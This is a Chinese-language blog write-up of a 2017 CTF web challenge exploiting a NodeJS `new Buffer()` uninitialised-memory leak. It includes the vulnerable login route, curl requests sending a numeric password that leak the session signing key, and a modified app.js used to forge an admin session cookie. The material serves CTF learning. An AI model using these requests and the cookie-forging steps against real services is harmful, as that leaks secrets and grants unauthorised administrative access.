---
title: CTF之NodeJS Buffer()引发内存泄露
date: 2017-03-16 15:41:21
categories: CTF
tags:
    - NodeJS
    - 内存泄露
---

## 背景介绍

参加2017 NJCTF比赛时碰见了一道NodeJS的web题，之前也没学过NodeJS, 于是上网搜了一下，搜到了原题 [https://www.smrrd.de/nodejs-hacking-challenge-writeup.html](https://www.smrrd.de/nodejs-hacking-challenge-writeup.html), 发现NJCTF在原题基础上改了入口代码，虽说在github上能搜到改过的原题，倒不如直接给源码来的痛快，这里就不提改过的题目了，直接分析原题，其中有几个点还是值得好好学习的。

<!-- more -->

## 环境搭建

安装好nodejs的环境，切换到源码更目录，安装依赖包`npm install`, 运行`npm start run`, 然后访问本机`http://localhost:3000`.

## 关键点分析

* post 请求

`/admin` 页面提交`password`，会向`/login`发送一个JSON类型的数据。

而NJCTF的题目更改了发送请求，直接发送的POST的数据(e.g. "password=...")，可以通过代理工具，更改发送请求类型，发送JSON类型的数据，以后做测试时要考虑服务器是否接受发送JSON类型的请求，如果接受，可以很好的扩大发送数据的类型。

服务器响应头返回Cookie设置`session`和`session.sig`，而`session`明显是base64编码过，解码为`{"admin":"no"}`，由于有`session.sig`的校验，单纯改`session`的值是无效的，要实现成功伪造`session`值，必须获得`config.js`配置的`session_keys`的值，然后本地搭建，获取`session.sig`.

* 内存泄露`session_keys`


```
router.post('/login', function(req, res, next) {
    if(req.body.password !== undefined) {
        var password = new Buffer(req.body.password);
        if(password.toString('base64') == config.secret_password) {
            req.session.admin = 'yes';
            res.json({'status': 'ok' });
        } else {
            res.json({'status': 'error', 'error': 'password wrong: '+password.toString() });
        }
    } else {
        res.json({'status': 'error', 'error': 'password missing' });
    }
});
```

`index.js`中根据用户提交的`password`生成新的Buffer对象，当`password`为字符串类型时，会生成同等大小的内存块，而当`password`为数字类型时，则生成指定大小的内存块， 而且Buffer返回的并不是全是0的内存块，而是之前在堆上分配的数据，这样就可以泄露内存数据，获取源码和数据。

```
> Buffer('AAAA')
<Buffer 41 41 41 41>
> Buffer(4)
<Buffer 90 4e 80 01>
> Buffer(4)
<Buffer 50 cc 02 02>
> Buffer(4)
<Buffer 0a 00 00 00>
```

令password=100(整数，也可以是更大的数，泄露出更多的数据), 多次重复发送post请求，会泄露出想要的`session_keys: ALLES{session_key_K.GKQeR0JS2b9OhwSH#UdMhL4EddxeD?}`

```
curl http://xxx.xxx.xxxx.xxx:3000/login -X POST -H "Content-Type: application/json" --data "{\"password\": 100}" | hexdump -C
00000000  7b 22 73 74 61 74 75 73  22 3a 22 65 72 72 6f 72  |{"status":"error|
00000010  22 2c 22 65 72 72 6f 72  22 3a 22 70 61 73 73 77  |","error":"passw|
00000020  6f 72 64 20 77 72 6f 6e  67 3a 20 41 4c 4c 45 53  |ord wrong: ALLES|
00000030  7b 73 65 73 73 69 6f 6e  5f 6b 65 79 5f 4b 2e 47  |{session_key_K.G|
00000040  4b 51 65 52 30 4a 53 32  62 39 4f 68 77 53 48 23  |KQeR0JS2b9OhwSH#|
00000050  55 64 4d 68 4c 34 45 64  64 78 65 44 3f 7d 72 64  |UdMhL4EddxeD?}rd|
00000060  41 70 70 7b 5c 22 61 64  6d 69 6e 5c 22 3a 5c 22  |App{\"admin\":\"|
00000070  6e 6f 5c 22 7d 3e 69 3c  21 44 4f 43 54 59 50 45  |no\"}>i<!DOCTYPE|
00000080  20 68 74 6d 6c 3e 3c 68  74 6d 6c 20 6e 67 2d 61  | html><html ng-a|
00000090  70 70 3d 22 7d                                    |pp="}|
00000095

curl http://xxx.xxx.xxx.xxx:3000/login -X POST -H "Content-Type: application/json" --data "{\"password\": 100}" | grep ALLES
{"status":"error","error":"password wrong: ALLES{session_key_K.GKQeR0JS2b9OhwSH#UdMhL4EddxeD?}><lin{\"admin\":\"no\"}eet\" href=\"/stylesheets/style."}
```

于是本地搭建环境，更改conf.js的`session_keys`, 然后更改`app.js`,强制令`req.session.admin = 'yes'`, 就可以获取了有效的`session`和`session.sig`.

```
app.use(function(req, res, next) {
  req.session.admin = 'yes';
  // if(req.session.admin === undefined) {
  //   req.session.admin = 'no';
  // }
  next();
});
```

伪造cookie访问目标网站即可。

{% asset_img admin.png %}
